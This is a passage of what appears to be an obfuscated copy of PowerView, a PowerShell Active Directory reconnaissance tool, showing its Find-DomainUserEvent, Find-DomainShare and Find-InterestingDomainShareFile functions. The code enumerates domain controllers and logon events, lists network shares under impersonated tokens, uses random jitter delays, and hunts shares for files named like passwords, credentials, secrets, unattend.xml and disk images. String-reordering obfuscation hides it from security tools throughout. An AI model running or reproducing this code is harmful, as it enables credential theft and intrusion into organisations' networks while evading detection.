            ${targeTU`S`E`Rs} = &("{1}{4}{0}{3}{2}"-f 'omainGro','G','er','upMemb','et-D') @GroupSearcherArguments | &("{3}{0}{4}{1}{2}" -f'el','t-Obje','ct','S','ec') -ExpandProperty ("{0}{1}{2}"-f'M','ember','Name')
        }

        
        if (${P`SBO`Und`ParAme`T`erS}[("{3}{2}{0}{1}" -f 'mputerNa','me','o','C')]) {
            ${TarGe`Tcom`PUt`e`Rs} = ${C`oMpUTErna`mE}
        }
        else {
            
            ${dCse`AR`ch`eRa`R`GuMents} = @{
                ("{1}{0}"-f 'P','LDA') = ${Tr`Ue}
            }
            if (${ps`Bo`UndpaRaMeTe`Rs}[("{0}{1}" -f'D','omain')]) { ${d`Cs`EARC`HeRAR`gu`mENtS}[("{1}{0}"-f'ain','Dom')] = ${D`o`maIN} }
            if (${psboUn`DPARam`et`eRS}[("{1}{0}"-f'ver','Ser')]) { ${D`CsEaRc`hErar`gU`M`ents}[("{1}{0}" -f'ver','Ser')] = ${SER`VEr} }
            if (${P`s`B`OUNdPar`AMEt`erS}[("{2}{3}{0}{1}"-f'ed','ential','C','r')]) { ${dc`s`EarchErARgUm`E`Nts}[("{0}{3}{1}{2}"-f 'Cr','den','tial','e')] = ${Cre`D`En`TiAl} }
            &("{0}{3}{4}{2}{1}"-f 'Wr','se','erbo','ite','-V') ('['+'Find-Do'+'main'+'Us'+'erE'+'vent] '+'Queryi'+'n'+'g '+'f'+'or '+'dom'+'ain '+'control'+'l'+'er'+'s '+'i'+'n '+'domai'+'n:'+' '+"$Domain")
            ${tArGE`Tco`M`pu`TerS} = &("{0}{4}{2}{3}{1}"-f 'Get','er','nC','ontroll','-Domai') @DCSearcherArguments | &("{0}{2}{1}"-f 'Se','ject','lect-Ob') -ExpandProperty ("{0}{2}{3}{1}"-f 'dnsho','name','s','t')
        }
        if (${t`A`RGEtCoM`pUtE`RS} -and (${T`ArGEtcOm`PU`TE`RS} -isnot [System.Array])) {
            ${TAr`G`ET`C`omp`UTeRS} = @(,${Ta`RGETCOMpU`T`Ers})
        }
        &("{1}{0}{3}{2}" -f 'V','Write-','rbose','e') "[Find-DomainUserEvent] TargetComputers length: $($TargetComputers.Length) "
        &("{2}{1}{0}" -f 'bose','e-Ver','Writ') ('['+'Fi'+'nd-'+'Domai'+'nUse'+'rEvent'+'] '+'TargetCo'+'mp'+'ut'+'er'+'s '+"$TargetComputers")
        if (${T`ARG`etcOmPuTeRS}."LE`NG`Th" -eq 0) {
            throw ("{6}{9}{7}{4}{3}{1}{12}{0}{13}{10}{8}{2}{11}{5}" -f'N','v','ts foun','E','r','merate','[','inUse','s','Find-Doma',' ho','d to enu','ent] ','o')
        }

        
        ${hO`S`TenU`Mbl`oCK} = {
            Param(${CO`MPUTeRN`Ame}, ${sT`AR`TtiME}, ${end`Ti`ME}, ${M`AX`eveN`Ts}, ${TARgEt`U`SE`Rs}, ${f`IL`Ter}, ${CR`ED`En`TiAl})

            ForEach (${TARGeTcOmP`U`T`eR} in ${Co`mp`Uter`NaME}) {
                ${UP} = &("{0}{3}{1}{2}" -f'Tes','onne','ction','t-C') -Count 1 -Quiet -ComputerName ${tar`geTC`Ompu`T`eR}
                if (${up}) {
                    ${DO`MaI`NUsEr`e`VEnT`A`Rgs} = @{
                        ("{0}{2}{3}{1}" -f'Computer','e','N','am') = ${TArGE`T`cOMPU`TeR}
                    }
                    if (${ST`Ar`TtimE}) { ${d`Oma`In`UserevE`NT`ArGs}[("{2}{1}{0}" -f 'tTime','ar','St')] = ${staRT`Ti`me} }
                    if (${En`Dti`Me}) { ${DoMa`InU`serEv`enTArGs}[("{1}{0}" -f 'ime','EndT')] = ${en`Dt`IME} }
                    if (${MAxe`VEn`Ts}) { ${d`oMa`Inu`SErEVe`NTarGs}[("{1}{0}{2}"-f 'xEve','Ma','nts')] = ${m`AXev`ENts} }
                    if (${CREdE`NT`i`Al}) { ${DomaIN`UsEREv`en`Ta`Rgs}[("{1}{0}{2}" -f'nti','Crede','al')] = ${cREd`Enti`AL} }
                    if (${FIL`T`eR} -or ${Targ`Et`UsERs}) {
                        if (${TA`Rg`Etu`Sers}) {
                            &("{4}{2}{1}{0}{3}{5}" -f 'e','nUs','et-Domai','rEv','G','ent') @DomainUserEventArgs | &("{1}{0}{2}"-f'Obje','Where-','ct') {${TAr`Get`USe`Rs} -contains ${_}."t`A`RGETuSErn`AmE"}
                        }
                        else {
                            ${o`pER`AtOr} = 'or'
                            ${FIL`T`er}."k`eys" | &("{2}{1}{3}{0}" -f'ect','Eac','For','h-Obj') {
                                if ((${_} -eq 'Op') -or (${_} -eq ("{1}{2}{0}" -f 'or','Op','erat')) -or (${_} -eq ("{3}{1}{0}{2}" -f'at','r','ion','Ope'))) {
                                    if ((${f`iLTER}[${_}] -match '&') -or (${f`Ilt`ER}[${_}] -eq 'and')) {
                                        ${oPEr`A`Tor} = 'and'
                                    }
                                }
                            }
                            ${ke`yS} = ${FI`l`TER}."K`EYs" | &("{0}{1}{2}" -f'Where','-Ob','ject') {(${_} -ne 'Op') -and (${_} -ne ("{1}{2}{0}" -f'ator','Ope','r')) -and (${_} -ne ("{1}{0}{2}"-f'io','Operat','n'))}
                            &("{3}{4}{2}{1}{0}" -f'ainUserEvent','m','t-Do','G','e') @DomainUserEventArgs | &("{2}{1}{0}" -f'h-Object','rEac','Fo') {
                                if (${opER`At`Or} -eq 'or') {
                                    ForEach (${K`Ey} in ${ke`Ys}) {
                                        if (${_}."$Key" -match ${fIl`T`er}[${k`eY}]) {
                                            ${_}
                                        }
                                    }
                                }
                                else {
                                    
                                    ForEach (${k`eY} in ${k`EYS}) {
                                        if (${_}."$Key" -notmatch ${f`IlT`ER}[${k`ey}]) {
                                            break
                                        }
                                        ${_}
                                    }
                                }
                            }
                        }
                    }
                    else {
                        &("{2}{3}{1}{0}{4}" -f'rEv','Use','Get-D','omain','ent') @DomainUserEventArgs
                    }
                }
            }
        }
    }

    PROCESS {
        
        if (${p`sBou`NdpA`RaM`eT`ERs}[("{0}{1}" -f'Del','ay')] -or ${PsB`OUNdpaR`A`MET`erS}[("{1}{3}{2}{0}"-f 'ss','StopO','Succe','n')]) {

            &("{2}{0}{1}"-f'e-Verb','ose','Writ') "[Find-DomainUserEvent] Total number of hosts: $($TargetComputers.count) "
            &("{3}{1}{0}{2}"-f 'Ve','ite-','rbose','Wr') ('[F'+'i'+'nd'+'-Dom'+'ainUserEve'+'nt]'+' '+'Dela'+'y: '+"$Delay, "+'Jitter:'+' '+"$Jitter")
            ${CO`UNT`Er} = 0
            ${rAN`dNo} = &("{0}{1}{2}" -f'N','ew-Ob','ject') ("{3}{2}{1}{0}" -f '.Random','m','yste','S')

            ForEach (${TaR`GETC`OmpUTeR} in ${tA`RGeTc`O`Mp`UTers}) {
                ${Coun`TeR} = ${Co`U`NTer} + 1

                
                &("{0}{2}{1}"-f 'Start','ep','-Sle') -Seconds ${Ra`NdNO}.("{0}{1}"-f'Nex','t').Invoke((1-${ji`TtER})*${De`l`AY}, (1+${jiT`TeR})*${de`L`AY})

                &("{1}{0}{2}"-f'Verbo','Write-','se') "[Find-DomainUserEvent] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count)) "
                ${resU`Lt} = &("{1}{2}{0}{3}"-f '-Comm','Invo','ke','and') -ScriptBlock ${H`OSTENUMBL`OcK} -ArgumentList ${tArGetC`om`p`UTer}, ${S`TArt`TiMe}, ${e`Ndti`mE}, ${m`A`x`evEnTs}, ${tA`Rg`eTuSe`Rs}, ${F`IltER}, ${cre`DeN`Ti`Al}
                ${rES`U`lt}

                if (${Re`SUlt} -and ${sto`ponSuC`c`eSs}) {
                    &("{0}{4}{3}{2}{1}" -f 'Wr','e','os','e-Verb','it') ("{7}{0}{5}{4}{8}{2}{6}{1}{9}{3}" -f 'in','ur','er found, ','early','serEvent] Tar','d-DomainU','ret','[F','get us','ning ')
                    return
                }
            }
        }
        else {
            &("{0}{4}{1}{3}{2}"-f'Wr','b','se','o','ite-Ver') ('[Find'+'-Domain'+'Use'+'r'+'Event'+'] '+'U'+'si'+'ng '+'thre'+'ad'+'ing '+'w'+'ith '+'th'+'read'+'s: '+"$Threads")

            
            ${s`cR`ipTParA`ms} = @{
                ("{2}{1}{0}" -f'e','tTim','Star') = ${StA`Rt`Ti`Me}
                ("{1}{0}{2}" -f 'Ti','End','me') = ${E`NDt`ImE}
                ("{0}{1}"-f'Max','Events') = ${MaXEve`N`Ts}
                ("{1}{2}{3}{0}" -f's','Targ','e','tUser') = ${Ta`RgET`U`SErS}
                ("{0}{1}{2}" -f'Fi','lte','r') = ${Fi`lTer}
                ("{1}{0}{3}{2}" -f 'e','Cr','ial','dent') = ${CREd`e`NtIal}
            }

            
            &("{0}{1}{3}{2}" -f'New','-ThreadedF','nction','u') -ComputerName ${tARG`EtcomP`UT`E`Rs} -ScriptBlock ${HOs`TenU`mbloCk} -ScriptParameters ${SC`RiPtPAR`Ams} -Threads ${THr`EA`DS}
        }
    }
}


function FINd`-d`omaINSH`A`RE {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{1}{2}"-f 'PSSho','uldProce','ss'}, '')]
    [OutputType({"{1}{2}{3}{0}" -f 'Info','PowerView.','Sh','are'})]
    Param(
        [Parameter(PosITioN = 0, VALueFROmpIpELiNE = ${Tr`UE}, vALuefrOMpIPELIneByproperTyNAme = ${TR`UE})]
        [Alias({"{2}{1}{0}"-f'e','am','DNSHostN'})]
        [String[]]
        ${cOmp`Ute`RNAMe},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f'Domai','n'})]
        [String]
        ${CoMPUTE`RD`oM`AiN},

        [ValidateNotNullOrEmpty()]
        [String]
        ${COmP`UTE`RLDapF`i`lT`er},

        [ValidateNotNullOrEmpty()]
        [String]
        ${CoMP`U`Ter`SeARcHbaSE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{3}{1}" -f 'S','tem','Operating','ys'})]
        [String]
        ${C`omPu`Te`Ro`peR`ATiNgsy`stEm},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{3}{0}" -f'Pack','Se','rvic','e'})]
        [String]
        ${Co`MPUTe`RSe`RViCep`ACk},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}" -f 'me','teNa','Si'})]
        [String]
        ${cOM`P`UtEr`SIt`EnaMe},

        [Alias({"{0}{2}{1}"-f 'Ch','ess','eckAcc'})]
        [Switch]
        ${C`hECK`sH`Ar`EaCc`EsS},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{1}{2}{0}"-f'ntroller','main','Co','Do'})]
        [String]
        ${Ser`V`er},

        [ValidateSet({"{0}{1}"-f'Ba','se'}, {"{1}{0}"-f 'eLevel','On'}, {"{2}{1}{0}"-f'e','btre','Su'})]
        [String]
        ${S`e`ArCH`sCoPE} = ("{0}{2}{1}"-f 'Subt','e','re'),

        [ValidateRange(1, 10000)]
        [Int]
        ${rE`SULTpAg`es`iZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${Se`RvERti`m`ELi`MiT},

        [Switch]
        ${TO`mbs`T`one},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`ReD`enT`IaL} =   ( Get-vaRiAbLE ('0d'+'SQr') -VALueOnl)::"Emp`Ty",

        [ValidateRange(1, 10000)]
        [Int]
        ${d`eLaY} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        ${JiTT`er} = .3,

        [Int]
        [ValidateRange(1, 100)]
        ${tHRe`A`DS} = 20
    )

    BEGIN {

        ${cOm`Put`eRSEar`chERARgume`N`Ts} = @{
            ("{1}{0}{2}"-f'er','Prop','ties') = ("{0}{1}{2}"-f'dnshos','tna','me')
        }
        if (${pS`B`o`Und`PARaMeTe`RS}[("{3}{1}{4}{2}{0}" -f'in','m','rDoma','Co','pute')]) { ${CoM`pUT`E`RSEArCheR`A`R`G`UM`EnTS}[("{1}{0}" -f'main','Do')] = ${C`o`mpu`TerDomaIN} }
        if (${pS`BoUnDPa`RAM`eTErs}[("{3}{1}{0}{4}{2}"-f'puterLDA','om','ilter','C','PF')]) { ${c`OMpUte`Rs`e`A`R`Che`RaRGUMeNts}[("{0}{2}{3}{1}"-f'LDAPF','r','il','te')] = ${C`OMpU`TE`RldAP`FIl`TER} }
        if (${pSb`OU`N`dp`AramEt`eRS}[("{4}{1}{0}{5}{2}{3}"-f'terSe','ompu','s','e','C','archBa')]) { ${C`ompUt`ErSe`Arc`hEraRgUm`enTS}[("{2}{1}{0}{3}"-f 'rchBa','ea','S','se')] = ${CO`MPut`Ers`EARCh`Ba`se} }
        if (${Ps`BOuNdp`ArAm`eterS}[("{0}{2}{1}" -f 'Unconst','ined','ra')]) { ${Co`mPUTE`RsEarCh`Er`Argu`m`En`Ts}[("{0}{1}{3}{2}"-f'Unco','nstrai','ed','n')] = ${UnC`ONS`TR`AInED} }
        if (${ps`BOun`D`PAr`A`MEteRs}[("{1}{5}{7}{3}{4}{6}{2}{0}"-f 'm','Com','e','ti','ngSy','pute','st','rOpera')]) { ${cOmPUTer`Se`ARch`EraRGuME`NtS}[("{2}{3}{0}{1}" -f 'ratingSy','stem','O','pe')] = ${opER`ATinGs`Y`s`TeM} }
        if (${p`SbOU`NdPAra`mEt`e`RS}[("{1}{2}{3}{4}{5}{0}"-f'ck','Com','puterSer','v','ic','ePa')]) { ${compuTErseaRcH`ERARg`UM`e`Nts}[("{3}{1}{0}{2}"-f'ce','i','Pack','Serv')] = ${SeRVI`CEp`A`ck} }
        if (${psB`OUnD`pA`RamETeRS}[("{1}{0}{3}{2}" -f'e','Comput','Name','rSite')]) { ${C`OMPuT`ErS`eaRC`Hera`RgU`mENtS}[("{0}{1}{2}" -f 'SiteN','am','e')] = ${si`T`E`NAME} }
        if (${P`SBoU`N`DpARAM`eTErS}[("{1}{0}"-f'er','Serv')]) { ${co`mpUT`ERs`earcH`e`RaRg`UMeNTs}[("{0}{1}" -f'Se','rver')] = ${SE`RV`Er} }
        if (${PSBO`UNdpA`RameTe`Rs}[("{2}{0}{1}" -f'e','archScope','S')]) { ${com`p`UTEr`seARChERARg`UMe`NTs}[("{2}{1}{0}" -f 'e','p','SearchSco')] = ${se`Ar`chS`cOPe} }
        if (${PS`BouN`DpAr`AMETErs}[("{0}{1}{2}"-f 'Res','u','ltPageSize')]) { ${co`m`P`UTerSeArCher`A`RG`UM`eNTs}[("{1}{2}{3}{0}" -f'ze','R','e','sultPageSi')] = ${R`E`S`ULtpAGeSizE} }
        if (${PSBO`U`ND`ParAMet`E`Rs}[("{1}{3}{4}{2}{0}" -f 't','ServerT','i','ime','Lim')]) { ${COmpu`TErse`ARcH`erAr`G`U`mE`NtS}[("{0}{4}{3}{2}{1}" -f'S','it','imeLim','erT','erv')] = ${se`Rv`e`RtiMELI`Mit} }
        if (${Psb`OuN`D`PAR`AmE`TErs}[("{2}{1}{0}" -f 'mbstone','o','T')]) { ${COMPUTErSEA`Rche`Rar`g`UmeNTs}[("{2}{1}{3}{0}"-f 'e','m','To','bston')] = ${Tom`B`st`ONE} }
        if (${psbo`U`N`DpARam`Ete`Rs}[("{0}{1}{2}" -f 'Cr','e','dential')]) { ${cO`MPU`TeR`se`Ar`chErar`gUm`E`NTs}[("{1}{0}{2}" -f'e','Cred','ntial')] = ${c`REdEn`T`IaL} }

        if (${p`sBOu`ND`PARA`Me`TerS}[("{3}{1}{2}{0}"-f 'puterName','o','m','C')]) {
            ${t`ARGETCo`mP`Ute`RS} = ${cO`M`puTE`RnAME}
        }
        else {
            &("{1}{2}{0}{3}" -f 'Verbo','Wri','te-','se') ("{8}{5}{0}{7}{6}{3}{2}{9}{4}{1}" -f'mai','n','ters in the','mpu','mai','o','uerying co','nShare] Q','[Find-D',' do')
            ${T`ARgetcOm`putERS} = &("{1}{3}{2}{0}"-f'ter','Get','u','-DomainComp') @ComputerSearcherArguments | &("{0}{3}{2}{1}"-f 'Select','ject','Ob','-') -ExpandProperty ("{1}{2}{0}" -f 'name','dnshos','t')
        }
        &("{2}{3}{4}{1}{0}"-f'ose','-Verb','Wr','i','te') "[Find-DomainShare] TargetComputers length: $($TargetComputers.Length) "
        if (${tAr`GetcO`mpUtE`RS}."Le`NgtH" -eq 0) {
            throw ("{7}{5}{4}{6}{2}{1}{3}{0}"-f'ate','nd to e','] No hosts fou','numer','d-D','in','omainShare','[F')
        }

        
        ${hOSt`e`N`Umb`LOck} = {
            Param(${c`omPUt`ErnAMe}, ${Ch`eckShA`REAc`c`ess}, ${tOkEnH`A`NDLe})

            if (${t`ok`EnH`Andle}) {
                
                ${NU`Ll} = &("{3}{2}{1}{4}{0}" -f 'on','UserImp','e-','Invok','ersonati') -TokenHandle ${toke`N`hAn`DlE} -Quiet
            }

            ForEach (${taR`G`EtComp`UTeR} in ${cOm`p`UteRnAMe}) {
                ${uP} = &("{3}{2}{1}{0}" -f 'ction','ne','est-Con','T') -Count 1 -Quiet -ComputerName ${T`ArGEt`c`oMput`er}
                if (${U`p}) {
                    
                    ${s`HaRes} = &("{2}{0}{1}" -f'tSh','are','Get-Ne') -ComputerName ${TaRgE`TCO`MpU`TER}
                    ForEach (${SHa`RE} in ${ShA`RES}) {
                        ${SHAr`ENA`Me} = ${s`haRe}."N`AMe"
                        
                        ${pA`TH} = '\\'+${T`A`R`gET`compUteR}+'\'+${sHa`R`eNAmE}

                        if ((${sHA`R`eNA`mE}) -and (${sH`AR`eName}.("{1}{0}"-f'rim','t').Invoke() -ne '')) {
                            
                            if (${Che`cKs`HaRe`AccE`SS}) {
                                
                                try {
                                    ${N`ULl} =  (  CHiLditem  vAriaBlE:6cl).ValuE::("{1}{0}" -f 'Files','Get').Invoke(${PA`TH})
                                    ${s`H`ARE}
                                }
                                catch {
                                    &("{0}{1}{2}{3}" -f 'Writ','e-Verb','o','se') ('Er'+'r'+'or '+'a'+'c'+'ces'+'sing '+'sh'+'are '+'path'+' '+"$Path "+': '+"$_")
                                }
                            }
                            else {
                                ${sH`ArE}
                            }
                        }
                    }
                }
            }

            if (${to`K`E`NhaNDle}) {
                &("{0}{3}{2}{4}{1}" -f 'Invoke','f','er','-Rev','tToSel')
            }
        }

        ${LO`GON`TO`KEn} = ${nU`lL}
        if (${P`sBO`UnDpaRa`mete`Rs}[("{2}{0}{1}"-f'rede','ntial','C')]) {
            if (${PsBOUndpAR`Am`Ete`RS}[("{1}{0}"-f 'y','Dela')] -or ${p`SBoun`dP`ARaM`eTers}[("{3}{0}{2}{1}"-f'pOnSuc','ss','ce','Sto')]) {
                ${Lo`gO`NTOkeN} = &("{4}{6}{5}{3}{1}{2}{0}" -f 'n','person','atio','rIm','Inv','-Use','oke') -Credential ${CrEden`T`IAL}
            }
            else {
                ${lOg`o`NTOk`en} = &("{4}{5}{0}{1}{6}{3}{7}{2}"-f'e-','U','n','rsonat','Inv','ok','serImpe','io') -Credential ${cRe`dE`NTiAL} -Quiet
            }
        }
    }

    PROCESS {
        
        if (${Ps`BO`U`NdPARAMe`TErs}[("{1}{0}" -f'ay','Del')] -or ${PsB`OU`N`d`parAMetE`Rs}[("{2}{0}{1}"-f 'opOn','Success','St')]) {

            &("{2}{0}{3}{1}"-f 'te-V','bose','Wri','er') "[Find-DomainShare] Total number of hosts: $($TargetComputers.count) "
            &("{0}{1}{4}{2}{3}" -f'Wr','i','e-Ve','rbose','t') ('['+'Find-Domai'+'n'+'Sh'+'are]'+' '+'D'+'el'+'ay: '+"$Delay, "+'Jitter:'+' '+"$Jitter")
            ${COuN`T`eR} = 0
            ${RA`Nd`No} = &("{0}{2}{3}{1}"-f 'N','ect','ew-Ob','j') ("{2}{3}{0}{1}" -f '.','Random','Sys','tem')

            ForEach (${Tar`gEt`COMp`UTeR} in ${TA`Rg`EtCoMPUT`erS}) {
                ${CoUNt`eR} = ${c`oU`NtER} + 1

                
                &("{1}{0}{3}{2}"-f't-','Star','p','Slee') -Seconds ${Ran`D`NO}.("{0}{1}" -f 'Ne','xt').Invoke((1-${JI`TT`er})*${DEL`Ay}, (1+${j`i`TtER})*${dE`L`Ay})

                &("{2}{3}{0}{1}" -f 'erbo','se','Wri','te-V') "[Find-DomainShare] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count)) "
                &("{0}{1}{2}" -f'Invo','ke-Com','mand') -ScriptBlock ${hO`STENUMB`lOck} -ArgumentList ${ta`RGetCom`P`UT`ER}, ${cHE`C`ksHare`ACceSs}, ${L`o`GontOKen}
            }
        }
        else {
            &("{1}{0}{3}{2}"-f'it','Wr','e','e-Verbos') ('['+'Find-D'+'o'+'m'+'ainShare] '+'Us'+'ing '+'thr'+'eadin'+'g '+'wit'+'h '+'thread'+'s:'+' '+"$Threads")

            
            ${sC`RIPTP`ARAmS} = @{
                ("{1}{0}{3}{2}{4}"-f'Sh','Check','eAcc','ar','ess') = ${c`H`ECk`ShAR`Ea`Ccess}
                ("{2}{3}{0}{1}" -f 'nHan','dle','To','ke') = ${L`ogoNTOK`eN}
            }

            
            &("{4}{1}{0}{2}{5}{3}{6}" -f 'w','e','-','eadedFunc','N','Thr','tion') -ComputerName ${TA`RgetC`o`mpute`RS} -ScriptBlock ${HOs`TeN`UMBlOck} -ScriptParameters ${sc`RI`ptpAr`AMS} -Threads ${t`hR`EadS}
        }
    }

    END {
        if (${Lo`go`NT`OkeN}) {
            &("{0}{1}{3}{2}" -f'I','nvoke','lf','-RevertToSe') -TokenHandle ${l`OGO`N`TOkEn}
        }
    }
}


function fINd-I`Nt`ERESTINgdOmAI`NshaRe`F`I`lE {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{0}{4}{1}{2}" -f'ho','ldProc','ess','PSS','u'}, '')]
    [OutputType({"{0}{4}{3}{2}{1}" -f'PowerVi','undFile','.Fo','w','e'})]
    [CmdletBinding(DeFauLTpaRAMetERsETNAMe = {"{2}{4}{0}{3}{1}"-f 'pecif','ion','Fi','icat','leS'})]
    Param(
        [Parameter(posITION = 0, VaLUeFrOMPiPeLIne = ${Tr`UE}, vAlueFrOMPipELInEBYPROpErtyNAME = ${T`Rue})]
        [Alias({"{1}{2}{0}"-f 'Name','DNSHos','t'})]
        [String[]]
        ${co`MpUTe`RN`AMe},

        [ValidateNotNullOrEmpty()]
        [String]
        ${cO`M`pu`TeRdO`main},

        [ValidateNotNullOrEmpty()]
        [String]
        ${cOMp`Ut`Er`LDAPfi`Lt`ER},

        [ValidateNotNullOrEmpty()]
        [String]
        ${c`OMPUTers`eArc`Hb`ASe},

        [ValidateNotNullOrEmpty()]
        [Alias({"{4}{3}{2}{0}{1}" -f 'ste','m','Sy','ting','Opera'})]
        [String]
        ${CoMPUTe`R`Op`eRATinG`S`y`STEm},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}" -f'ack','Ser','viceP'})]
        [String]
        ${cOmpU`TeR`sE`R`VicePaCk},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f'iteName','S'})]
        [String]
        ${COmP`UtERsIT`ENA`me},

        [Parameter(pARamETERseTnaME = "f`iL`Esp`ECiFiCA`TIOn")]
        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}" -f'Search','T','erms'}, {"{0}{1}" -f'Te','rms'})]
        [String[]]
        ${INcl`U`de} = @(("{1}{0}{2}"-f 'swor','*pas','d*'), ("{2}{3}{0}{1}"-f'tiv','e*','*sens','i'), ("{1}{2}{0}"-f 'in*','*ad','m'), ("{2}{1}{0}"-f'gin*','o','*l'), ("{0}{1}" -f '*sec','ret*'), ("{1}{2}{0}" -f 'ml','un','attend*.x'), ("{0}{1}" -f '*','.vmdk'), ("{1}{0}"-f '*','*creds'), ("{1}{2}{0}{3}" -f'nt','*','crede','ial*'), ("{0}{2}{1}"-f'*','onfig','.c')),

        [ValidateNotNullOrEmpty()]
        [ValidatePattern({(("{3}{1}{2}{0}{4}" -f'0','0}','{0}{','{0}{','}')) -F [char]92})]
        [Alias({"{0}{1}"-f'Shar','e'})]
        [String[]]
        ${sH`ArE`p`AtH},

        [String[]]
        ${ex`clu`dEdsha`RES} = @('C$', ((('A'+'dminx1'+'Z')  -REPlaCe'x1Z',[CHar]36)), (('PrintX'+'1C')."r`ep`lacE"(([ChaR]88+[ChaR]49+[ChaR]67),'$')), ((('I'+'PC'+'VBS')-RePLaCE'VBS',[chAR]36))),

        [Parameter(pARAMeTeRSEtName = "fi`L`esPEC`iFIcatiOn")]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${LAS`T`AccESS`TiME},

        [Parameter(PArAmetErSETname = "f`ilEsP`eC`IficaT`IOn")]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${laS`TWRiTeT`i`mE},

        [Parameter(paraMeteRSEtNaMe = "F`I`LEspECi`FIcAt`i`ON")]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${C`RE`Atio`NtiMe},

        [Parameter(pARAmeTERsETname = "O`FfI`cEdo`cs")]
        [Switch]
        ${Of`FI`c`edoCs},

        [Parameter(paramETERsetNAME = "FRE`sh`exeS")]
        [Switch]
        ${fRe`Sh`eXeS},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{1}{3}" -f'nCo','ntroll','Domai','er'})]
        [String]
        ${s`ErVer},

        [ValidateSet({"{1}{0}"-f'e','Bas'}, {"{1}{2}{0}"-f 'evel','One','L'}, {"{0}{1}{2}"-f'Subt','re','e'})]
        [String]
        ${SeaRCHS`C`opE} = ("{0}{1}"-f 'Subt','ree'),

        [ValidateRange(1, 10000)]
        [Int]
        ${r`e`SULtpaGeS`ize} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${s`e`Rver`TIMeLIMit},

        [Switch]
        ${TOM`B`sTo`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CR`edeN`Ti`AL} =  (  vArIaBLE ("0Ds"+"Qr") -valUeOnLy)::"Em`PtY",

        [ValidateRange(1, 10000)]
        [Int]
        ${D`eLAY} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        ${j`I`TtEr} = .3,

        [Int]
        [ValidateRange(1, 100)]
        ${t`h`ReaDs} = 20
    )

    BEGIN {
        ${CO`mpUtErSEaR`CHErar`Gu`M`eNTS} = @{
            ("{0}{2}{1}" -f'Pr','ies','opert') = ("{2}{0}{1}"-f 'h','ostname','dns')
        }
        if (${P`sBoUnd`PARa`meters}[("{3}{1}{2}{0}"-f'omain','omput','erD','C')]) { ${c`o`mPu`TeRS`Earc`HeRar`GUmenTs}[("{1}{0}"-f 'ain','Dom')] = ${C`O`MPuTERdOMaIn} }
        if (${P`sBoUnd`PaRA`METErs}[("{0}{2}{1}{4}{3}" -f 'C','ilt','omputerLDAPF','r','e')]) { ${CO`mPu`TErsE`A`Rc`h`E`RArguME`NTs}[("{1}{0}{2}" -f'APFilt','LD','er')] = ${c`o`M`Pu`TERLDApfi`LTEr} }
        if (${PSbound`PaRAM`E`TerS}[("{1}{0}{4}{3}{2}" -f'Sea','Computer','se','a','rchB')]) { ${c`O`MPU`TeRsEar`c`hE`RarGuMEntS}[("{1}{2}{0}" -f 'se','S','earchBa')] = ${coMp`Ut`E`RsEAR`CHb`Ase} }
        if (${PsbouND`Pa`RAMET`Ers}[("{1}{0}{3}{2}{4}" -f'ompu','C','rOperatingSys','te','tem')]) { ${c`omPU`TERSeA`RC`herArg`UMENts}[("{2}{3}{1}{4}{0}" -f'm','r','Op','e','atingSyste')] = ${OPERat`iN`g`S`ySTEm} }
        if (${Ps`B`OuNdpa`RaMeteRs}[("{0}{1}{2}{3}" -f 'Co','mputer','Servi','cePack')]) { ${ComP`U`T`ERse`A`RcHErar`GUmENTS}[("{1}{0}{3}{2}" -f'viceP','Ser','ck','a')] = ${SER`VIcEp`A`CK} }
        if (${PSBo`UND`PArA`mEteRS}[("{1}{2}{3}{0}" -f'terSiteName','Com','p','u')]) { ${COMPUt`ErSeaRc`H`ER`ARgU`M`E`N`TS}[("{1}{0}" -f'Name','Site')] = ${SITE`NA`ME} }
        if (${PSB`oUnD`p`AramE`TE`Rs}[("{1}{2}{0}" -f 'rver','S','e')]) { ${com`Pu`TeRsEarC`he`RarGuMen`Ts}[("{2}{0}{1}" -f 'e','r','Serv')] = ${s`E`RVer} }
        if (${psbo`Und`PAr`AmetE`Rs}[("{0}{1}{2}{3}"-f 'S','ear','chSc','ope')]) { ${coMPuterSeA`RcHerar`g`UM`E`N`Ts}[("{1}{2}{0}"-f 'pe','Sear','chSco')] = ${Searc`hs`cO`pe} }
        if (${p`SBoUNDPAR`AMetE`RS}[("{3}{2}{4}{1}{0}" -f'eSize','g','l','Resu','tPa')]) { ${c`oMpUT`eRsEa`RcHERAR`g`UmENtS}[("{3}{2}{1}{0}" -f 'ageSize','ultP','es','R')] = ${rE`SUl`TP`Age`sIZE} }
        if (${Psb`OUnD`PA`R`AMETErS}[("{2}{3}{1}{0}" -f'eLimit','Tim','Se','rver')]) { ${coMpU`TErS`ea`RCH`ERarg`U`Me`NTs}[("{3}{4}{1}{0}{2}"-f 'L','e','imit','Serv','erTim')] = ${S`e`R`VErtiMelIM`iT} }
        if (${pSBo`Un`dPAraMEt`erS}[("{1}{2}{0}" -f 'stone','Tom','b')]) { ${Com`puTeRs`EarChEr`A`RGUmEN`TS}[("{0}{1}{2}" -f'To','m','bstone')] = ${tO`mb`StONE} }
        if (${pSb`O`Un`dpar`AmeTERS}[("{1}{0}{2}" -f'en','Cred','tial')]) { ${compu`T`ER`seArChe`RAr`GUmen`Ts}[("{0}{2}{1}" -f 'Cre','ential','d')] = ${c`R`eDenTi`AL} }

